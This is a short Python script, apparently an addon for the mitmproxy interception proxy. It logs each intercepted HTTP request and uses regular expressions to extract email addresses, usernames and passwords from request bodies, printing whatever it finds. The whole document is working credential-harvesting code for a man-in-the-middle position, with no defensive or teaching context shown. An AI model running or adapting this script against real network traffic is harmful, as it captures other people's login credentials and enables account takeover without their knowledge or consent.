import re
from mitmproxy import http

# Function to extract email, username, and password using regex
def extract_credentials(flow: http.HTTPFlow):
    if flow.request.content:
        load = flow.request.content.decode(errors='ignore')

        # Regex patterns for email, username, and password
        email_pattern = re.compile(r'[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+')
        password_pattern = re.compile(r'password=([^&\s]+)')
        username_pattern = re.compile(r'username=([^&\s]+)')

        emails = email_pattern.findall(load)
        passwords = password_pattern.findall(load)
        usernames = username_pattern.findall(load)

        if emails:
            print("[*] Found Email(s):", emails)
        if passwords:
            print("[*] Found Password(s):", passwords)
        if usernames:
            print("[*] Found Username(s):", usernames)

# mitmproxy event handler
def request(flow: http.HTTPFlow) -> None:
    print(f"[*] {flow.request.method} {flow.request.host}{flow.request.path}")
    extract_credentials(flow)